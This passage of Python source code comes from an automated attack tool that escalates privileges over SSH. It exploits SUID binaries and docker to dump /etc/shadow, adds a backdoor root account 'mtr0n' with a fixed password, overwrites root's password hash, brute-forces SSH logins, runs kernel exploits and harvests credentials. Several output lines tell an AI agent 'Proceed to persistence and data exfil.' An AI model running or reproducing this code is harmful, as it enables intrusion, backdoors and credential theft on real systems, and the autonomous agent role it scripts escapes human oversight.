                            output += f"  [+] SUID FIND PRIVESC SUCCESSFUL!\n"

                    elif vbin == "python" or vbin == "python3":
                        id_result = _ssh_exec(client, f"{vbin} -c 'import os; os.setuid(0); os.system(\"id\")' 2>&1", timeout=10)
                        output += f"  [PROOF] {vbin} setuid → {id_result.strip()}\n"
                        print(f"    {C_CYAN}[PROOF] {vbin} → {id_result.strip()[:80]}{C_RESET}")
                        if "uid=0" in id_result:
                            got_root = True

                    elif vbin in ("vim", "vi"):
                        id_result = _ssh_exec(client, f"{vbin} -c ':!id' --not-a-term 2>&1 | head -5", timeout=10)
                        output += f"  [PROOF] {vbin} → {id_result.strip()}\n"

                    elif vbin == "env":
                        id_result = _ssh_exec(client, "/usr/bin/env /bin/bash -p -c 'id' 2>&1", timeout=10)
                        output += f"  [PROOF] env bash -p → {id_result.strip()}\n"
                        if "uid=0" in id_result or "euid=0" in id_result:
                            got_root = True

                    elif vbin == "mount":
                        output += f"  [!] mount SUID — not directly exploitable for root shell.\n"
                        output += f"  [!] Useful only with specific mount-based attacks (e.g. NFS).\n"

                    else:
                        # Generic attempt
                        id_result = _ssh_exec(client, f"{vexploit} 2>&1 | head -5", timeout=10)
                        output += f"  [PROOF] {vexploit[:60]} → {id_result.strip()[:200]}\n"
                        if "uid=0" in id_result or "euid=0" in id_result:
                            got_root = True

                elif vtype == "DOCKER":
                    output += f"\n[PRIVESC ATTEMPT: DOCKER]\n"
                    id_result = _ssh_exec(client, "docker run -v /:/mnt --rm alpine cat /mnt/etc/shadow 2>&1 | head -10", timeout=30)
                    output += f"  [PROOF] docker shadow dump → {id_result.strip()[:500]}\n"
                    if "$" in id_result and "root:" in id_result:
                        got_root = True
                        output += f"  [+] DOCKER PRIVESC SUCCESSFUL!\n"
                        output += f"\n[PROOF: /etc/shadow via docker]\n{id_result[:2000]}\n"

                elif vtype == "WRITABLE_PASSWD":
                    output += f"\n[PRIVESC ATTEMPT: WRITABLE PASSWD]\n"
                    backdoor_hash = "$1$octopus$f5P0MG/LjCXF.GUyFKPyB."  # password: m3tatr0n
                    _ssh_exec(client, f"echo 'mtr0n:{backdoor_hash}:0:0::/root:/bin/bash' >> /etc/passwd", timeout=10)
                    check = _ssh_exec(client, "grep mtr0n /etc/passwd 2>&1", timeout=5)
                    output += f"  [PROOF] grep mtr0n /etc/passwd → {check.strip()}\n"
                    if "mtr0n" in check:
                        got_root = True
                        output += f"  [+] WRITABLE PASSWD PRIVESC — added user 'mtr0n' (pass: m3tatr0n) UID 0\n"

                elif vtype == "WRITABLE_SHADOW":
                    output += f"\n[PRIVESC ATTEMPT: WRITABLE SHADOW]\n"
                    print(f"    {C_RED}[*] Exploiting writable /etc/shadow...{C_RESET}")
                    # Generate a known hash for password 'm3tatr0n'
                    gen_hash = _ssh_exec(client, "openssl passwd -1 -salt octopus 'm3tatr0n' 2>/dev/null", timeout=5).strip()
                    if not gen_hash or gen_hash.startswith("[!]"):
                        gen_hash = "$1$octopus$f5P0MG/LjCXF.GUyFKPyB."
                    output += f"  Generated hash: {gen_hash}\n"

                    # Backup and replace root hash in /etc/shadow
                    _ssh_exec(client, "cp /etc/shadow /etc/shadow.bak 2>/dev/null", timeout=5)
                    # Use sed to replace root's hash
                    sed_cmd = f"sed -i 's|^root:[^:]*:|root:{gen_hash}:|' /etc/shadow 2>&1"
                    sed_result = _ssh_exec(client, sed_cmd, timeout=10)
                    output += f"  sed result: {sed_result.strip()[:200]}\n"

                    # Verify: try su to root with new password
                    check = _ssh_exec(client, "echo 'm3tatr0n' | su -c 'id' root 2>&1", timeout=10)
                    output += f"  [PROOF] su root → {check.strip()[:200]}\n"
                    if "uid=0" in check:
                        got_root = True
                        output += f"  [+] WRITABLE SHADOW PRIVESC SUCCESSFUL! root password → m3tatr0n\n"
                        print(f"    {C_GREEN}[+] ROOT via writable /etc/shadow! Password: m3tatr0n{C_RESET}")
                        # Register new root credential
                        try:
                            from tools import register_credential
                            register_credential("ssh", host, "root", "m3tatr0n")
                        except ImportError:
                            pass
                        # Dump shadow as proof
                        shadow = _ssh_exec(client, "echo 'm3tatr0n' | su -c 'cat /etc/shadow' root 2>/dev/null", timeout=10)
                        if shadow and "$" in shadow:
                            output += f"\n[PROOF: /etc/shadow via writable shadow]\n{shadow[:2000]}\n"
                    else:
                        # Try SSH login directly
                        try:
                            test_client, test_err = _ssh_connect(host, "root", "m3tatr0n", port)
                            if not test_err:
                                id_out = _ssh_exec(test_client, "id", timeout=5)
                                test_client.close()
                                if "uid=0" in id_out:
                                    got_root = True
                                    output += f"  [+] WRITABLE SHADOW PRIVESC SUCCESSFUL via SSH! root:m3tatr0n\n"
                                    print(f"    {C_GREEN}[+] ROOT via SSH with new shadow password!{C_RESET}")
                                    try:
                                        from tools import register_credential
                                        register_credential("ssh", host, "root", "m3tatr0n")
                                    except ImportError:
                                        pass
                        except Exception as _exc:
                            logging.debug(f"Suppressed in privesc.py: {_exc}")
                    if not got_root:
                        output += f"  [-] Shadow modification did not yield root access.\n"

                elif vtype == "LXD":
                    output += f"\n[PRIVESC ATTEMPT: LXD]\n"
                    output += f"  AI: Use LXD container escape: lxc init alpine priv -c security.privileged=true\n"

            # ── FINAL PRIVESC STATUS ─────────────────────────────
            if got_root:
                output += f"\n[+] ✓ PRIVILEGE ESCALATION CONFIRMED — ROOT ACCESS OBTAINED\n"
                print(f"\n  {C_GREEN}[+] ✓ ROOT ACCESS CONFIRMED{C_RESET}")
            else:
                output += f"\n[-] Privesc vectors tested but none yielded root.\n"
                print(f"\n  {C_YELLOW}[-] No privesc succeeded{C_RESET}")

        else:
            output += "\n[-] No obvious privesc vectors found.\n"

        if got_root and CFG.get("killchain", {}).get("quick_privesc_after_root", True):
            output += (
                "\n[+] Root confirmed; deferred extra user testing and credential "
                "harvest to dedicated post-exploitation stages.\n"
            )
            output += "\nAI: ROOT ACCESS OBTAINED. Proceed to persistence and data exfil.\n"
            return output

        # ── v6.0: TEST DISCOVERED USERS ──────────────────────────
        # Try SSH login for key users with known passwords
        # Uses direct SSH connect (never hangs — has 3s timeout per attempt)
        import paramiko as _paramiko
        import time as _time

        print(f"\n    {C_CYAN}[*] Testing user credentials (root + discovered users)...{C_RESET}")
        output += f"\n{'═' * 60}\n"
        output += "[USER CREDENTIAL TESTING]\n"

        # Get login users from /etc/passwd
        try:
            passwd_out = _ssh_exec(client, "cat /etc/passwd 2>/dev/null", timeout=8)
        except Exception as e:
            passwd_out = ""
        login_users = []
        for line in passwd_out.splitlines():
            p = line.split(":")
            if len(p) >= 7 and p[6] not in ("/usr/sbin/nologin", "/bin/false",
                                              "/sbin/nologin", "/bin/nologin", ""):
                uname = p[0]
                if uname not in ("daemon", "bin", "sys", "sync",
                                  "games", "man", "lp", "mail", "news",
                                  "nobody", user):  # skip current user but keep root
                    login_users.append(uname)

        # Ensure root is tested FIRST (most valuable)
        if "root" in login_users:
            login_users.remove("root")
        login_users.insert(0, "root")

        output += f"  Testing: {', '.join(login_users[:5])}{'...' if len(login_users) > 5 else ''}\n"

        # Known passwords — deduplicated, prioritized
        known_passwords = [password, "root", "toor", "admin", "123456"]
        known_passwords = list(dict.fromkeys(known_passwords))[:3]  # max 3

        tested = 0
        successful_logins = []
        section_start = _time.time()
        SECTION_TIMEOUT = 25  # hard cap: 25 seconds for entire section

        for target_user in login_users[:5]:  # max 5 users
            if _time.time() - section_start > SECTION_TIMEOUT:
                output += f"  [!] Section timeout ({SECTION_TIMEOUT}s) — stopping user tests.\n"
                print(f"    {C_YELLOW}[!] User testing timeout{C_RESET}")
                break

            for pwd_attempt in known_passwords:
                if _time.time() - section_start > SECTION_TIMEOUT:
                    break
                tested += 1
                try:
                    test_client = _paramiko.SSHClient()
                    test_client.set_missing_host_key_policy(_paramiko.AutoAddPolicy())
                    test_client.connect(
                        host, port=port, username=target_user,
                        password=pwd_attempt, timeout=3,  # fast timeout
                        allow_agent=False, look_for_keys=False,
                        banner_timeout=5
                    )
                    # Login succeeded!
                    _, stdout, _ = test_client.exec_command("id", timeout=3)
                    id_out = stdout.read().decode("utf-8", errors="replace").strip()
                    test_client.close()

                    successful_logins.append({
                        "user": target_user, "password": pwd_attempt,
                        "id": id_out[:100]
                    })
                    output += f"  [+] SSH {target_user}:{pwd_attempt} → {id_out[:80]}\n"
                    print(f"    {C_GREEN}[+] LOGIN: {target_user}:{pwd_attempt} → {id_out[:60]}{C_RESET}")

                    try:
                        from tools import register_credential
                        register_credential("ssh", host, target_user, pwd_attempt)
                    except ImportError:
                        pass

                    if "uid=0" in id_out:
                        got_root = True
                        output += f"  [+] ✓ ROOT VIA SSH login as {target_user}!\n"
                        print(f"    {C_GREEN}[+] ✓ ROOT ACCESS via {target_user}!{C_RESET}")
                    break  # got this user, move to next

                except _paramiko.AuthenticationException:
                    pass  # wrong password
                except Exception as e:
                    break  # connection error, skip this user entirely

                _time.sleep(0.1)

        elapsed = _time.time() - section_start
        output += f"  Tested {tested} combinations in {elapsed:.1f}s\n"
        if successful_logins:
            output += f"  Successful logins: {len(successful_logins)}\n"
            for sl in successful_logins:
                output += f"    ✓ {sl['user']}:{sl['password']} → {sl['id']}\n"
        else:
            output += f"  No additional logins found.\n"

        # ── FINAL STATUS ─────────────────────────────────────────
        if got_root:
            output += f"\nAI: ROOT ACCESS OBTAINED. Proceed to persistence and data exfil.\n"
        else:
            output += f"\nAI: No root obtained. Try kernel exploits:\n"
            kernel = _ssh_exec(client, "uname -r 2>/dev/null", timeout=5)
            output += f"  Kernel: {kernel.strip()}\n"
            output += f"  [SEARCH: {kernel.strip()} privilege escalation exploit]\n"
            output += f"  [SEARCH: CVE-2021-4034 pkexec PwnKit exploit]\n"

            # ── PHASE 3: Auto kernel exploits ────────────────────
            kernel_exploit_adapters = get_privesc_exploits()
            if not kernel_exploit_adapters:
                output += "  [!] Kernel exploit adapters are not enabled in this build.\n"
                output += "      Manual verification is required before running kernel exploit modules.\n"
            else:
                names = ", ".join(f"{exploit.name}({exploit.cve})" for exploit in kernel_exploit_adapters)
                output += f"  Loaded kernel exploit adapters: {names}\n"
            for exploit in kernel_exploit_adapters:
                if got_root:
                    break
                check_result = exploit.normalize_check_result(exploit.check_vulnerable(client))
                is_vuln = check_result.success
                reason = check_result.evidence or check_result.output
                if is_vuln or (exploit.cve and exploit.cve in str(linpeas_cves)):
                    print(f"    {C_RED}[*] Trying {exploit.name} ({exploit.cve}) - {reason}...{C_RESET}")
                    run_result = exploit.normalize_run_result(exploit.run(client))
                    success, exp_out = run_result.as_tuple()
                    output += exp_out
                    if success:
                        got_root = True

        # v8.0: Credential Harvesting after root
        if got_root:
            try:
                harvest_out = _harvest_credentials(client, host)
                output += harvest_out
            except Exception as e:
                output += f"\n[!] Credential harvest error: {e}\n"

    finally:
        client.close()

    return output


# ═══════════════════════════════════════════════
# STAGE 4: ACTIVE PERSISTENCE
# ═══════════════════════════════════════════════
